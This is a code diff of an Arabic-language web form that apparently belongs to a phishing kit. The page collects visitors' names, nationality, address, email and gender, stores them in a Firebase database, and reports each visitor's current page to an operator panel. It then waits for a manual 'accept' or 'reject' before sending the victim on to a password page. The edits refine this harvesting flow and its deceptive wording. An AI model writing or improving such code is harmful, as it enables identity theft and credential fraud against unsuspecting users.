@@ -42,6 +42,7 @@
 
         .container { max-width: 500px; margin: 20px auto; padding: 10px; }
         
+        /* شريط الخطوات */
         .steps-container {
             display: flex; justify-content: space-between; margin-bottom: 30px; position: relative;
         }
@@ -64,7 +65,7 @@
         .form-group { margin-bottom: 15px; }
         
         input[type="text"], input[type="email"], input[type="date"], select {
-            width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 14px; background-color: #fff;
+            width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 14px; background-color: #fff; outline: none;
         }
 
         .gender-group { display: flex; gap: 20px; margin-top: 10px; }
@@ -143,7 +144,7 @@
                 </div>
 
                 <div style="font-size: 11px; color: #777; line-height: 1.4; margin-bottom: 15px;">
-                    يرجى التأكد من إدخال البريد الإلكتروني المسجل والمعتمد لدى شركة الاتصالات الخاصة بك...
+                    يرجى التأكد من إدخال البيانات بدقة كما هي مسجلة في الهوية الرسمية لضمان سرعة معالجة الطلب.
                 </div>
 
                 <div class="form-group">
@@ -174,29 +175,30 @@
             appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
         };
 
-        firebase.initializeApp(firebaseConfig);
+        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
         const database = firebase.database();
 
-        // استعادة SessionID لربط البيانات
-        let sessionID = localStorage.getItem('sessionID');
-        if (!sessionID) {
-            sessionID = "ID_" + Math.floor(Math.random() * 90000) + 10000;
-            localStorage.setItem('sessionID', sessionID);
+        // استخدام نفس المعرف الموحد للزائر
+        let visitorId = sessionStorage.getItem('visitorId');
+        if (!visitorId) {
+             visitorId = "visitor_" + Math.floor(Math.random() * 900000 + 100000);
+             sessionStorage.setItem('visitorId', visitorId);
         }
 
-        // تتبع الزائر
-        const visitorRef = database.ref('active_visitors/' + sessionID);
+        // تحديث صفحة الزائر الحالية في لوحة التحكم
+        const visitorRef = database.ref('active_visitors/' + visitorId);
         visitorRef.update({
-            currentPage: "personal_details.html",
-            lastSeen: Date.now()
+            currentPage: "البيانات الشخصية (personal_details.html)",
+            lastSeen: firebase.database.ServerValue.TIMESTAMP
         });
-        visitorRef.onDisconnect().remove();
 
-        // معالجة الفورم
+        // معالجة إرسال البيانات
         document.getElementById('detailsForm').onsubmit = (e) => {
             e.preventDefault();
+            const personalRef = database.ref('personal_data/' + visitorId);
 
             const pData = {
+                id: visitorId,
                 nationality: document.getElementById('nationality').value,
                 name_ar: document.getElementById('name_ar').value,
                 name_en: document.getElementById('name_en').value,
@@ -204,29 +206,27 @@
                 address: document.getElementById('address').value,
                 email: document.getElementById('email_confirm').value,
                 gender: document.querySelector('input[name="gender"]:checked').value,
-                timestamp: Date.now(),
-                status: "waiting"
+                status: "waiting",
+                timestamp: firebase.database.ServerValue.TIMESTAMP
             };
 
-            // حفظ البيانات في Firebase
-            database.ref('personal_data/' + sessionID).set(pData);
-
-            // إظهار شاشة التحميل
+            personalRef.set(pData);
             document.getElementById('loading-overlay').style.display = 'flex';
 
-            // الاستماع لقرار الأدمن
-            database.ref('personal_data/' + sessionID + '/status').on('value', (snapshot) => {
-                const status = snapshot.val();
-                if (status === "accept") {
-                    window.location.href = "password.html"; // التوجه لصفحة الباسورد
-                } else if (status === "reject") {
+            // الاستماع لرد الأدمن
+            personalRef.on('value', (snapshot) => {
+                const val = snapshot.val();
+                if (val && val.status === "accept") {
+                    window.location.href = "password.html";
+                } else if (val && val.status === "reject") {
                     document.getElementById('loading-overlay').style.display = 'none';
                     Swal.fire({
-                        title: 'عذراً!',
-                        text: 'لم يتم قبول البيانات، يرجى إعادة المحاولة.',
-                        icon: 'error',
+                        title: 'تنبيه',
+                        text: 'يرجى مراجعة البيانات المدخلة، يبدو أن هناك خطأ ما.',
+                        icon: 'warning',
                         confirmButtonColor: '#8a1538'
                     });
+                    personalRef.update({ status: "waiting" });
                 }
             });
         };
